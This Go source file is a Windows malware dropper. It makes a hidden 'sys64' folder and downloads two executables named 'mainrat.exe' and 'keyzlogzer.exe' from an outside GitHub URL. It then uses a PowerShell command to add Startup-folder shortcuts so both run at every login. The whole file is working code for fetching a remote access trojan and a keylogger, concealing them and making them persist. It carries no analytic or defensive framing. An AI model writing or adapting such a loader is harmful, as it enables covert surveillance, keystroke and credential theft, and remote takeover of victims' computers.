package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

var (
	shell32          = syscall.NewLazyDLL("shell32.dll")
	shGetFolderPathA = shell32.NewProc("SHGetFolderPathA")
)

// Create hidden folder
func MakeHiddenFolder(path string) error {
	err := os.MkdirAll(path, 0700)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(syscall.StringToUTF16Ptr(path), syscall.FILE_ATTRIBUTE_HIDDEN)
}

// Copy file
func CopyFile(sourcePath, destPath string) error {
	src, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer src.Close()

	dest, err := os.Create(destPath)
	if err != nil {
		return err
	}
	defer dest.Close()

	_, err = dest.ReadFrom(src)
	return err
}

// Get Startup folder path
func GetStartupFolder() (string, error) {
	var path [syscall.MAX_PATH]byte
	csidlStartup := 0x0007
	r, _, _ := shGetFolderPathA.Call(0, uintptr(csidlStartup), 0, 0, uintptr(unsafe.Pointer(&path[0])))
	if r != 0 {
		return "", fmt.Errorf("SHGetFolderPathA failed")
	}
	return string(path[:strings.IndexByte(string(path[:]), 0)]), nil
}

// Create shortcut to file in startup
func CreateShortcutToStartup(targetPath, shortcutName string) error {
	startupFolder, err := GetStartupFolder()
	if err != nil {
		return err
	}
	shortcutPath := filepath.Join(startupFolder, shortcutName+".lnk")
	psScript := fmt.Sprintf(`$s=(New-Object -COM WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Description='Auto run';$s.Save()`, shortcutPath, targetPath)

	cmd := exec.Command("powershell", "-Command", psScript)
	return cmd.Run()
}

// Download file to given destination dir
func DownloadFile(fileURL, destinationDir string) (string, error) {
	// Make sure directory exists
	if _, err := os.Stat(destinationDir); os.IsNotExist(err) {
		os.MkdirAll(destinationDir, 0755)
	}

	// Get filename
	fileName := filepath.Base(fileURL)
	if !strings.Contains(fileName, ".") {
		fileName += ".bin"
	}

	// Final path
	filePath := filepath.Join(destinationDir, fileName)

	// Download
	resp, err := http.Get(fileURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	out, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return "", err
	}

	return filePath, nil
}

func main() {
	// Step 1: Create hidden folder
	targetFolder := `C:\fake\LINA\Desktop\games\sys64`
	if err := MakeHiddenFolder(targetFolder); err != nil {
		fmt.Println("Failed to create hidden folder:", err)
		return
	}

	// Step 2: Download files to that folder
	urls := []string{
		"https://github.com/NobelTad/test/raw/refs/heads/main/mainrat.exe",
		"https://github.com/NobelTad/test/raw/refs/heads/main/keyzlogzer.exe",
	}
	for _, url := range urls {
		fmt.Println("Downloading:", url)
		filePath, err := DownloadFile(url, targetFolder)
		if err != nil {
			fmt.Println("Failed to download:", err)
			continue
		}
		fmt.Println("Saved to:", filePath)

		// Step 3: Create shortcut in Startup
		name := strings.TrimSuffix(filepath.Base(filePath), filepath.Ext(filePath))
		if err := CreateShortcutToStartup(filePath, name); err != nil {
			fmt.Println("Failed to create startup shortcut for", filePath, ":", err)
		}
	}

	fmt.Println("All done.")
}
